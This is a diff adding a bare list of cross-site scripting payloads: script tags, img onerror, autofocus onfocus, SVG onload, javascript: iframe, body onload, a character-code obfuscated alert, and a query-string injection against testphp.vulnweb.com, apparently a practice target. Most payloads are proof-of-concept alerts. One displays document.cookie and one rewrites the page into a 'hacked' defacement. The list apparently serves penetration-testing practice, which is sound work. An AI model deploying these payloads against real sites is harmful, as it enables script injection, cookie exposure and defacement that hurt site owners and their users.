@@ -1,0 +1,35 @@
+xss reflected
+
+<script>alert("XSS Attack!");</script>
+<script>alert(document.cookie);</script>
+
+
+xss stored
+<script>alert("Stored XSS");</script>
+<script>document.body.innerHTML = "<h1>You've been 
+hacked!</h1>";</script>
+<img src="nonexistent.jpg" onerror="alert('Stored XSS with img');">
+<input type="text" value="XSS"onfocus="alert('Stored XSS onfocus')" autofocus>
+<a href="#" onclick="alert('Stored XSS on click');">Click me</a>
+<div onmouseover="alert('Stored XSS on hover')"> Hover over this text!</div>
+
+
+Using an SVG Element 
+ <svg onload="alert('Stored XSS with SVG')"> </svg>
+Iframe Tag to Inject a Script
+
+ <iframe src="javascript:alert('Stored XSS with iframe');"></iframe>
+JavaScript Execution with Event Handlers
+
+ <body onload="alert('Stored XSS on page load');">
+
+
+URL Parameter Injection
+
+ https://testphp.vulnweb.com/search.php?query=<script>alert('XSS in URL');</script>
+
+ <script>alert(String.fromCharCode(88,83,83)); </script>
+
+ <svg onload="alert('XSS SVG')"></svg>
+
+ <body onload="alert('Stored XSS on page load');">
